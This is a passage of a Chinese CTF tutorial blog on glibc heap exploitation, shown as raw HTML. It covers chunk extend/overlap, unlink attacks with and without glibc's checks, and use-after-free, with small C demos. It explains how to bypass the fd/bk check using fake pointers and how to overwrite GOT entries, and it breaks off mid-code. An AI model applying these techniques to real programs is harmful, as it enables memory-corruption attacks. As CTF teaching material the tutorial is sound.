punctuation">;</span>    ptr <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// 分配第 1 个 0x80 的 chunk1</span>    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// 分配第 2 个 0x10 的 chunk2</span>    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// 分配第 3 个 0x10 的 chunk3</span>    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// 分配第 4 个 0x10 的 chunk4    </span>        <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span> ptr <span class="token operator">-</span> <span class="token number">0x8</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0x61</span><span class="token punctuation">;</span>    <span class="token function">free</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>    ptr1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x50</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当 <code>malloc</code> 分配四个堆块后：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A816.png" alt="CTF - PWN_堆相关的漏洞与利用16.png"></p><p>修改 <code>chunk1</code> 的 <code>size</code> 域为 <code>0x61</code>（包括了 <code>chunk2</code>、<code>chunk3</code> 的大小）：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A817.png" alt="CTF - PWN_堆相关的漏洞与利用17.png"></p><p>此时 <code>free</code> 掉 <code>chunk1</code>，则 <code>chunk2</code>、<code>chunk3</code> 也一并被 <code>free</code> 进入 <code>fast bin</code>：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A818.png" alt="CTF - PWN_堆相关的漏洞与利用18.png"></p><p>在 <code>malloc(0x50)</code> 对 <code>extend</code> 区域重新占位后，其中 <code>0x10</code> 的 <code>fastbin</code> 块依然可以正常的分配和释放：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A819.png" alt="CTF - PWN_堆相关的漏洞与利用19.png"></p><p>此时已经构成 <code>Overlap</code>，通过对 <code>Overlap</code> 的进行操作可以实现 <code>fastbin attack</code></p><hr><h2 id="通过-extend-前向-Overlap"><a href="#通过-extend-前向-Overlap" class="headerlink" title="通过 extend 前向 Overlap"></a>通过 extend 前向 Overlap</h2><p>示例：（64 位程序）</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">void</span> <span class="token operator">*</span>ptr1<span class="token punctuation">,</span> <span class="token operator">*</span>ptr2<span class="token punctuation">,</span> <span class="token operator">*</span>ptr3<span class="token punctuation">,</span> <span class="token operator">*</span>ptr4<span class="token punctuation">;</span>    ptr1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// smallbin1</span>    ptr2 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// fastbin1</span>    ptr3 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// fastbin2</span>    ptr4 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// smallbin2</span>    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// 防止与 top 合并</span>    <span class="token function">free</span><span class="token punctuation">(</span>ptr1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token keyword">long</span><span class="token punctuation">)</span> ptr4 <span class="token operator">-</span> <span class="token number">0x8</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0x90</span><span class="token punctuation">;</span>   <span class="token comment">// 修改 pre_inuse 域</span>    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token keyword">long</span><span class="token punctuation">)</span> ptr4 <span class="token operator">-</span> <span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0xd0</span><span class="token punctuation">;</span>   <span class="token comment">// 修改 pre_size 域</span>    <span class="token function">free</span><span class="token punctuation">(</span>ptr4<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// unlink 进行前向 extend</span>    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x150</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// 占位块</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当 <code>malloc</code> 分配五个堆块后：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A820.png" alt="CTF - PWN_堆相关的漏洞与利用20.png"></p><p>此时 <code>free</code> 掉 <code>chunk1</code> 使其置入 <code>unsorted bin</code>：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A821.png" alt="CTF - PWN_堆相关的漏洞与利用21.png"></p><p>修改 <code>chunk4</code> 的 <code>size</code> 域为 <code>0x90</code>（其中 <code>pre_inuse</code> 位为 0，代表前一个 <code>chunk</code> 空闲）</p><p>修改 <code>pre_size</code> 域为 <code>0xd0</code>（包括了 <code>chunk2</code> 和 <code>chunk3</code> 的大小）：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A822.png" alt="CTF - PWN_堆相关的漏洞与利用22.png"></p><p>此时 <code>free</code> 掉 <code>chunk4</code>，会导致 <code>chunk2</code> 和 <code>chunk3</code> 也一并被 <code>free</code>，同时与 <code>free</code> 掉 <code>chunk1</code> 后形成的 <code>unsorted bin</code> 合并：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A823.png" alt="CTF - PWN_堆相关的漏洞与利用23.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A824.png" alt="CTF - PWN_堆相关的漏洞与利用24.png"></p><p>在 <code>malloc(0x150)</code> 对 <code>extend</code> 区域重新占位后，就可以得到 <code>chunk1 + chunk2 + chunk3 + chunk4</code> 的堆块</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A825.png" alt="CTF - PWN_堆相关的漏洞与利用25.png"></p><p>前向 <code>extend</code> 利用了 <code>smallbin</code> 的 unlink 机制，通过修改 <code>pre_size</code> 域可以跨越多个 <code>chunk</code> 进行合并实现 <code>Overlap</code></p><hr><h1 id="Unlink"><a href="#Unlink" class="headerlink" title="Unlink"></a>Unlink</h1><blockquote><p><code>unlink()</code> 是 Glibc 中的一个宏，其目的是将某一个空闲 <code>chunk</code> 从其所处的 <code>bin</code> 中脱链</p><ul><li>在 <code>malloc_consolidate()</code> 函数中用于将 <code>fast bin</code> 中的空闲 <code>chunk</code> 整理到 <code>unsorted bin</code>  </li><li>在 <code>malloc()</code> 函数中用于将 <code>unsorted bin</code> 中的空闲 <code>chunk</code> 整理到 <code>small bin</code> 或者 <code>large bin</code>，以及在 <code>malloc()</code> 中获得堆空间时，均有可能调用 <code>unlink()</code> 宏</li></ul><p>参考文章：  </p><ol><li><a href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/unlink/">Unlink - CTF Wiki</a>  </li><li><a href="https://blog.csdn.net/Morphy_Amo/article/details/122631424">【pwn学习】堆溢出（三）- Unlink和UAF_pwn unlink-CSDN博客</a></li></ol></blockquote><p>在利用 unlink 所造成的漏洞时，其实就是对 <code>chunk</code> 进行内存布局，然后借助 unlink 操作来达成修改指针的效果</p><p><code>unlink()</code> 的大致流程如下：</p><ol><li>首先根据 <code>chunk P</code> 的 <code>fd</code> 和 <code>bk</code> 参数确定 <code>chunk P</code> 在 <code>bin</code> 中的前后 <code>chunk</code> 分别为 <code>FD</code> 和 <code>BK</code></li><li>然后让 <code>chunk FD</code> 的 <code>bk</code> 参数指向 <code>chunk BK</code></li><li>最后让 <code>chunk BK</code> 的 <code>fd</code> 参数指向 <code>chunk FD</code></li></ol><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A826.png" alt="CTF - PWN_堆相关的漏洞与利用26.png"></p><hr><h2 id="没有防护的-unlink"><a href="#没有防护的-unlink" class="headerlink" title="没有防护的 unlink"></a>没有防护的 unlink</h2><blockquote><p>这是比较古老的 unlink 利用方法，没有对 <code>chunk</code> 的 <code>size</code> 检查和双向链表检查</p></blockquote><p>Glibc 中没有防护的 <code>unlink()</code> 宏定义：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">unlink</span><span class="token expression"><span class="token punctuation">(</span>AV<span class="token punctuation">,</span> P<span class="token punctuation">,</span> BK<span class="token punctuation">,</span> FD<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                                            </span></span>    FD <span class="token operator">=</span> P<span class="token operator">-></span>fd<span class="token punctuation">;</span>   <span class="token comment">//获取显式链表中前一个块 FD      </span>    BK <span class="token operator">=</span> P<span class="token operator">-></span>bk<span class="token punctuation">;</span>   <span class="token comment">//获取显示链表中后一个块 BK              </span>    FD<span class="token operator">-></span>bk <span class="token operator">=</span> BK<span class="token punctuation">;</span>  <span class="token comment">//设置FD的后一个块      </span>    BK<span class="token operator">-></span>fd <span class="token operator">=</span> FD<span class="token punctuation">;</span>  <span class="token comment">//设置BK的前一个块</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>假设堆内存最初的布局如图（32 位程序）：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A827.png" alt="CTF - PWN_堆相关的漏洞与利用27.png"></p><p>上图中有两个物理空间连续的 <code>chunk</code>，分别是 <code>Q</code> 和 <code>Nextchunk</code>，并且 <code>Q</code> 处于使用状态，<code>Nextchunk</code> 处于释放状态</p><p>如果我们通过某种方式（比如：溢出）将 <code>Nextchunk</code> 的 <code>fd</code> 和 <code>bk</code> 指针修改为指定的值，则当我们 <code>free(Q)</code> 时，会发生如下步骤：</p><ol><li>Glibc 判断 <code>chunk Q</code> 是 <code>small chunk</code>  </li><li>判断前向合并，发现前一个 <code>chunk</code> 处于使用状态，不需要前向合并  </li><li>判断后向合并，发现后一个 <code>chunk</code> 处于空闲状态，需要合并  </li><li>继而对 <code>Nextchunk</code> 采取 unlink 操作</li></ol><p>按照前面所提到的 <code>unlink()</code> 的大致流程，可以将该过程总结如下：</p><ol><li><code>FD = P -&gt; fd = target addr - 12</code>  </li><li><code>BK = P -&gt; bk = expect value</code>  </li><li><code>FD -&gt; bk = BK</code>，即：<code>*(target addr - 12 + 12) = BK = expect value</code>  </li><li><code>BK -&gt; fd = FD</code>，即：<code>*(expect value + 8) = FD = target addr - 12</code></li></ol><p>这样一来，我们可以通过 unlink 直接实现任意地址读写的目的，但是还是需要确保 <code>expect value + 8</code> 的地址处具有可写的权限</p><blockquote><p>例如将 <code>target addr</code> 设置为某个 GOT 表项，那么当程序调用对应的 libc 函数时，就会直接执行我们设置的值 <code>expect value</code> 处的代码</p><p><strong>需要注意的是，<code>expect value + 8</code> 处的值被破坏了，需要想办法绕过</strong></p></blockquote><hr><h2 id="存在防护的-unlink"><a href="#存在防护的-unlink" class="headerlink" title="存在防护的 unlink"></a>存在防护的 unlink</h2><blockquote><p>目前的 unlink 通常是存在检查的，此时就没有那么简单了</p></blockquote><p>由于 unlink 的危险性，Glibc 添加了一些检测机制，存在防护的 <code>unlink()</code> 宏如下：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">/* Take a chunk off a bin list */</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">unlink</span><span class="token expression"><span class="token punctuation">(</span>AV<span class="token punctuation">,</span> P<span class="token punctuation">,</span> BK<span class="token punctuation">,</span> FD<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                                            </span><span class="token punctuation">\</span>    <span class="token expression">FD <span class="token operator">=</span> P<span class="token operator">-></span>fd<span class="token punctuation">;</span>      </span><span class="token punctuation">\</span>    <span class="token expression">BK <span class="token operator">=</span> P<span class="token operator">-></span>bk<span class="token punctuation">;</span>      </span></span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__builtin_expect</span> <span class="token punctuation">(</span>FD<span class="token operator">-></span>bk <span class="token operator">!=</span> P <span class="token operator">||</span> BK<span class="token operator">-></span>fd <span class="token operator">!=</span> P<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      \      <span class="token function">malloc_printerr</span> <span class="token punctuation">(</span>check_action<span class="token punctuation">,</span> <span class="token string">"corrupted double-linked list"</span><span class="token punctuation">,</span> P<span class="token punctuation">,</span> AV<span class="token punctuation">)</span><span class="token punctuation">;</span>  \    <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>      \        FD<span class="token operator">-></span>bk <span class="token operator">=</span> BK<span class="token punctuation">;</span>      \        BK<span class="token operator">-></span>fd <span class="token operator">=</span> FD<span class="token punctuation">;</span>      \        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_smallbin_range</span> <span class="token punctuation">(</span>P<span class="token operator">-></span>size<span class="token punctuation">)</span>      \            <span class="token operator">&amp;&amp;</span><span class="token function">__builtin_expect</span> <span class="token punctuation">(</span>P<span class="token operator">-></span>fd_nextsize <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      \    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__builtin_expect</span> <span class="token punctuation">(</span>P<span class="token operator">-></span>fd_nextsize<span class="token operator">-></span>bk_nextsize <span class="token operator">!=</span> P<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>      \<span class="token operator">||</span> <span class="token function">__builtin_expect</span> <span class="token punctuation">(</span>P<span class="token operator">-></span>bk_nextsize<span class="token operator">-></span>fd_nextsize <span class="token operator">!=</span> P<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    \      <span class="token function">malloc_printerr</span> <span class="token punctuation">(</span>check_action<span class="token punctuation">,</span>      \       <span class="token string">"corrupted double-linked list (not small)"</span><span class="token punctuation">,</span>    \       P<span class="token punctuation">,</span> AV<span class="token punctuation">)</span><span class="token punctuation">;</span>      \            <span class="token keyword">if</span> <span class="token punctuation">(</span>FD<span class="token operator">-></span>fd_nextsize <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      \                <span class="token keyword">if</span> <span class="token punctuation">(</span>P<span class="token operator">-></span>fd_nextsize <span class="token operator">==</span> P<span class="token punctuation">)</span>      \                  FD<span class="token operator">-></span>fd_nextsize <span class="token operator">=</span> FD<span class="token operator">-></span>bk_nextsize <span class="token operator">=</span> FD<span class="token punctuation">;</span>      \                <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>      \                    FD<span class="token operator">-></span>fd_nextsize <span class="token operator">=</span> P<span class="token operator">-></span>fd_nextsize<span class="token punctuation">;</span>      \                    FD<span class="token operator">-></span>bk_nextsize <span class="token operator">=</span> P<span class="token operator">-></span>bk_nextsize<span class="token punctuation">;</span>      \                    P<span class="token operator">-></span>fd_nextsize<span class="token operator">-></span>bk_nextsize <span class="token operator">=</span> FD<span class="token punctuation">;</span>      \                    P<span class="token operator">-></span>bk_nextsize<span class="token operator">-></span>fd_nextsize <span class="token operator">=</span> FD<span class="token punctuation">;</span>      \                  <span class="token punctuation">&#125;</span>      \              <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>      \                P<span class="token operator">-></span>fd_nextsize<span class="token operator">-></span>bk_nextsize <span class="token operator">=</span> P<span class="token operator">-></span>bk_nextsize<span class="token punctuation">;</span>      \                P<span class="token operator">-></span>bk_nextsize<span class="token operator">-></span>fd_nextsize <span class="token operator">=</span> P<span class="token operator">-></span>fd_nextsize<span class="token punctuation">;</span>      \              <span class="token punctuation">&#125;</span>      \          <span class="token punctuation">&#125;</span>      \      <span class="token punctuation">&#125;</span>      \<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中，对 <code>fd</code> 和 <code>bk</code> 的检查：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// fd bk</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__builtin_expect</span> <span class="token punctuation">(</span>FD<span class="token operator">-></span>bk <span class="token operator">!=</span> P <span class="token operator">||</span> BK<span class="token operator">-></span>fd <span class="token operator">!=</span> P<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                      \  <span class="token function">malloc_printerr</span> <span class="token punctuation">(</span>check_action<span class="token punctuation">,</span> <span class="token string">"corrupted double-linked list"</span><span class="token punctuation">,</span> P<span class="token punctuation">,</span> AV<span class="token punctuation">)</span><span class="token punctuation">;</span>  \<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>如果按照没有防护的 unlink 中提到的场景，当前：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">FD <span class="token operator">-></span> bk <span class="token operator">=</span> target addr <span class="token operator">-</span> <span class="token number">12</span> <span class="token operator">+</span> <span class="token number">12</span> <span class="token operator">=</span> target addrBK <span class="token operator">-></span> fd <span class="token operator">=</span> expect value <span class="token operator">+</span> <span class="token number">8</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>但在这种情况下，修改 GOT 表项的方法可能就不可用了</p><p>不过，我们可以通过伪造的方式绕过这个机制：</p><p>首先通过覆盖，将 <code>Nextchunk</code> 的 <code>FD</code> 指针指向 <code>fakeFD</code>，将 <code>Nextchunk</code> 的 <code>BK</code> 指针指向 <code>fakeBK</code></p><p>为了通过验证，需要满足：</p><ul><li><code>fakeFD -&gt; bk == P</code>，即：<code>*(fakeFD + 12) == P</code></li><li><code>fakeBK -&gt; fd == P</code>，即：<code>*(fakeBK + 8) == P</code></li></ul><p>当满足上述两式时，可以进入 unlink 的环节，进行如下操作：</p><ul><li><code>fakeFD -&gt; bk = fakeBK</code>，即：<code>*(fakeFD + 12) = fakeBK</code></li><li><code>fakeBK -&gt; fd = fakeFD</code>，即：<code>*(fakeBK + 8) = fakeFD</code></li></ul><p>如果让 <code>fakeFD + 12</code> 和 <code>fakeBK + 8</code> 指向同一个指向 P 的指针，那么：</p><ul><li><code>*P = P - 8</code></li><li><code>*P = P - 12</code></li></ul><p>通过这种方式，P 的指针指向了比自己低 12 的地址处</p><blockquote><p>此方法虽然不可以实现任意地址写，但是可以修改指向 <code>chunk</code> 的指针，这样的修改是可以达到一定的效果的</p></blockquote><p>如果我们想要使得两者都指向 P，只需要按照如下方式修改即可：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A828.png" alt="CTF - PWN_堆相关的漏洞与利用28.png"></p><p>由于 P 在 unlink 前是指向正确的 <code>chunk</code> 的指针，因此不受如下检测的影响：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// 由于P已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致。</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__builtin_expect</span> <span class="token punctuation">(</span><span class="token function">chunksize</span><span class="token punctuation">(</span>P<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token function">prev_size</span> <span class="token punctuation">(</span><span class="token function">next_chunk</span><span class="token punctuation">(</span>P<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      \  <span class="token function">malloc_printerr</span> <span class="token punctuation">(</span><span class="token string">"corrupted size vs. prev_size"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>               \<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><blockquote><p>如果我们设置 <code>Nextchunk</code> 的 <code>fd</code> 和 <code>bk</code> 均为 <code>Nextchunk</code> 的地址也是可以绕过上面的检测的</p><p>但是这样不能达到修改指针内容的效果</p></blockquote><hr><h2 id="利用思路-1"><a href="#利用思路-1" class="headerlink" title="利用思路"></a>利用思路</h2><p>利用 unlink 漏洞的条件：</p><ol><li>存在 UAF 漏洞，可修改 <code>free</code> 状态下 <code>small bin</code> 或是 <code>unsorted bin</code> 的 <code>fd</code> 和 <code>bk</code> 指针  </li><li>已知位置存在一个指针指向可进行 UAF 的 <code>chunk</code></li></ol><p>实现的效果：使得已指向存在 UAF 漏洞的 <code>chunk</code> 的指针 <code>ptr</code> 变为 <code>ptr - 0x18</code></p><p>假设指向存在 UAF 漏洞的 <code>chunk</code> 的指针的地址为 <code>ptr</code>，则实现的主要步骤为：</p><ol><li>修改 <code>fd</code> 为 <code>ptr - 0x18</code>  </li><li>修改 <code>bk</code> 为 <code>ptr - 0x10</code>  </li><li>触发 unlink，<code>ptr</code> 处的指针会变为 <code>ptr - 0x18</code></li></ol><hr><h1 id="Use-After-Free"><a href="#Use-After-Free" class="headerlink" title="Use After Free"></a>Use After Free</h1><blockquote><p>Use After Free 简称 UAF，即：释放后使用漏洞，指一个内存块被释放之后再次被使用</p></blockquote><p>对于内存块释放之后的操作，有以下几种情况：</p><ol><li><p><strong>内存块被释放后，其对应的指针被设置为 NULL</strong>，然后再次使用，自然程序会崩溃  </p></li><li><p><strong>内存块被释放后，其对应的指针没有被设置为 NULL</strong>，然后在它下一次被使用之前，<em>没有代码对这块内存块进行修改</em>，那么程序很有可能可以正常运转  </p></li><li><p><strong>内存块被释放后，其对应的指针没有被设置为 NULL</strong>，但是在它下一次使用之前，<em>有代码对这块内存块进行了修改</em>，那么当程序再次使用这块内存时，就很有可能会出现奇怪的问题</p></li></ol><p>通常我们所说的 UAF 漏洞对应的就是 2 和 3</p><p>也就是说，<em>UAF 漏洞利用的前提是：内存块被释放后，其对应的指针没有被设置为 NULL</em></p><p>示例：（64 位程序）</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">name</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">char</span> <span class="token operator">*</span>myname<span class="token punctuation">;</span>  <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>func<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> NAME<span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">myprint</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>str<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s\n"</span><span class="token punctuation">,</span> str<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">printmyname</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"call print my name\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  NAME <span class="token operator">*</span>a<span class="token punctuation">;</span>  a <span class="token operator">=</span> <span class="token punctuation">(</span>NAME <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">name</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  a <span class="token operator">-></span> func <span class="token operator">=</span> myprint<span class="token punctuation">;</span>  a <span class="token operator">-></span> myname <span class="token operator">=</span> <span class="token string">"I can also use it"</span><span class="token punctuation">;</span>  a <span class="token operator">-></span> <span class="token function">func</span><span class="token punctuation">(</span><span class="token string">"this is my function"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">free</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// free without modify</span>  a <span class="token operator">-></span> <span class="token function">func</span><span class="token punctuation">(</span><span class="token string">"I can also use it"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// free with modify</span>  a <span class="token operator">-></span> func <span class="token operator">=</span> printmyname<span class="token punctuation">;</span>  a <span class="token operator">-></span> <span class="token function">func</span><span class="token punctuation">(</span><span class="token string">"this is my function"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// set NULL</span>  a <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"this pogram will crash...\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  a <span class="token operator">-></span> <span class="token function">func</span><span class="token punctuation">(</span><span class="token string">"can not be 